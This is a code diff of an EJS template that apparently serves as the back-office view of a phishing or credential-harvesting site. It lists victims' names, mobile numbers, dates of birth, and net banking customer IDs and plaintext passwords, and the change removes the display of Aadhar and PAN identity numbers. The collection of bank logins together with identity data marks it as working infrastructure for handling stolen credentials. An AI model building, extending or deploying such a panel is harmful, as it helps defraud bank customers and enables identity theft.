@@ -15,24 +15,23 @@
   <!-- Main Content Container -->
   <div class="user-detail-container">
 
-<!-- User Details Section -->
-<h2>User Details</h2>
+    <!-- User Details Section -->
+    <h2>User Details</h2>
 
-<% if (userEntries.length > 0) { %>
-  <% userEntries.forEach((entry, index) => { %>
-    <div class="card">
-      <h3>User Information - <%= index + 1 %></h3>
-      <p><strong>Name:</strong> <%= entry.name %></p>
-      <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
-      <p><strong>Aadhar:</strong> <%= entry.aadhar %></p>
-      <p><strong>PAN:</strong> <%= entry.pan %></p>
-      <p><strong>DOB:</strong> <%= entry.dob %></p>
-      <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
-    </div>
-  <% }); %>
-<% } else { %>
-  <p>No User Data Found</p>
-<% } %>
+    <% if (userEntries.length > 0) { %>
+      <% userEntries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>User Information - <%= index + 1 %></h3>
+          <p><strong>Name:</strong> <%= entry.name %></p>
+          <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
+          <p><strong>DOB:</strong> <%= entry.dob %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No User Data Found</p>
+    <% } %>
+
     <!-- NetBanking Details Section -->
     <h2>Net Banking Details</h2>
     <% if (netBanking && netBanking.length > 0) { %>
@@ -44,7 +43,6 @@
               <h4>Transaction <%= index + 1 %></h4>
               <p><strong>customerId:</strong> <%= entry.customerId %></p>
               <p><strong>password:</strong> <%= entry.password %></p>
-            
               <p><strong>Transaction Date:</strong> <%= new Date(entry.transactionDate).toLocaleString() %></p>
             </div>
           <% }); %>
